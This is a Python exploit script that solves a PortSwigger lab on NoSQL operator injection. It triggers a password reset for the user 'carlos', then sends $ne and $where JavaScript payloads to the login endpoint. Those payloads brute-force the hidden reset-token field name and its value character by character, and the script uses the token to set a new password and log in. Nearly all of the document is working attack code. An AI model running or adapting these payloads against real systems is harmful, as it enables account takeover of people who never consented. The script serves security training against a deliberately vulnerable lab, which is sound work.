# Exploiting NoSQL operator injection to extract unknown fields

# https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import string
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

CHARS = string.ascii_lowercase + string.ascii_uppercase + string.digits + '@.-_ '


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def send_reset_password_request(s, url):
	print("[+] Trying to send a forgot-password request for carlos user...")
	reset_path = url + '/forgot-password'
	r = s.get(reset_path)
	csrf_token = get_csrf_token(r)
	reset_data = {
		"csrf": csrf_token,
		"username": "carlos"
	}
	r = s.post(reset_path, data=reset_data)
	if r.status_code == 200 and 'Please check your email for a reset password link.' in r.text:
		print("[+] Reset password sent !\n")

def find_json_parameter(s, url):
	print("[+] Trying to find the forgot-password Token field name...")
	login_path = url + '/login'
	parameter = ''
	for i in range(0, 20):
		for char in CHARS:
			sys.stdout.write('\rJSON parameter: ' + parameter + char)
			payload = {"username": "carlos", "password": {"$ne":"invalid"}, "$where":f"Object.keys(this)[4].match('^.{{{str(i)}}}{char}.*')"}
			r = s.post(login_path, json=payload)
			if r.status_code == 200 and 'Account locked: please reset your password' in r.text:
				parameter += char
				break
			sys.stdout.flush()
			if char == ' ':
				print(f"\n[+] Found JSON parameter:\t{parameter}")
				return parameter

def get_reset_token(s, url, parameter):
	print("\n[+] Trying to find the forgot-password Token value...")
	login_path = url + '/login'
	token = ''
	for i in range(0, 36):
		for char in CHARS:
			sys.stdout.write('\rReset token: ' + token + char)
			payload = {"username": "carlos", "password": {"$ne":"invalid"}, "$where":f"this.{parameter}.match('^.{{{str(i)}}}{char}.*')"}
			r = s.post(login_path, json=payload)
			if r.status_code == 200 and 'Account locked: please reset your password' in r.text:
				token += char
				break
			sys.stdout.flush()
			if char == ' ':
				print(f"\n[+] Found Reset password token:\t{token}")
				return token

def change_password(s, url, parameter, token):
	print("\n[+] Trying to change carlos's password...")
	reset_full_path = url + '/forgot-password?' + parameter + '=' + token
	r = s.get(reset_full_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	reset_data = {
		"csrf": csrf_token,
		"new-password-1": "password123",
		"new-password-2": "password123",
		parameter: token,
		"username": "carlos"
	}
	r = s.post(reset_full_path, data=reset_data, allow_redirects=False)
	if r.status_code == 302:
		print('[+] Password successfully reset !\n')
		return True
	else:
		print(r.text)
	return False

def connect_as_carlos(s, url):
	print("\n[+] Trying to log in as carlos with the new password...")
	login_path = url + '/login'
	login_data = {
	"username": "carlos",
	"password": "password123"
	}
	r = s.post(login_path, json=login_data)


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Exploiting NoSQL operator injection to extract unknown fields')
	parser = argparse.ArgumentParser(description="[+] Lab: Exploiting NoSQL operator injection to extract unknown fields")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print("[+] Trying to retrieve carlos's password...\n")
			send_reset_password_request(s, url)
			parameter = find_json_parameter(s, url)
			token = get_reset_token(s, url, parameter)
			if change_password(s, url, parameter, token):
				connect_as_carlos(s, url)

			s.cookies.clear()
			s.headers.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()

